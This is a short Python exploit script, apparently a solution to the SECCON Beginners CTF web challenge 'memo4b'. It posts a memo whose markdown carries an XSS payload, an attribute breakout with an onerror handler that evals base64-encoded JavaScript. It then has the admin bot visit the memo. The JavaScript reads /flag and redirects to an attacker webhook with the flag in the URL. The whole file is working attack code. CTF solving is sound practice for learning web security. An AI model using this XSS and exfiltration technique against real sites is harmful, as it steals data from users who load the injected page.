#!/usr/bin/env python3
import requests
import base64

WEBHOOK_URL = "https://**REDACTED**"  # TODO: 攻撃者のサーバーを指定してください
WEB_URL = "http://memo4b.challenges.beginners.seccon.jp:50000"
BOT_URL = "http://memo4b.challenges.beginners.seccon.jp:50001"

js_code = f"fetch('/flag').then(r=>r.text()).then(f=>location='{WEBHOOK_URL}?flag='+f)"
encoded = base64.b64encode(js_code.encode()).decode()
payload = f':https://example.com/x.jpg#" onerror="eval(atob(\'{encoded}\'))":'

data = {
    "title": "Test",
    "md": payload
}

# 1. メモを投稿
r = requests.post(WEB_URL + "/", data=data, allow_redirects=False)
post_id = r.headers["Location"].split("/")[-1]
print(f"[+] Created post: {post_id}")

# 2. botに訪問を依頼
r = requests.post(BOT_URL + "/visit", json={"postId": post_id})
print(f"[+] Bot visit status: {r.text}")

# 3. Webhookでフラグを確認
print(f"[+] Check your webhook at: {WEBHOOK_URL}")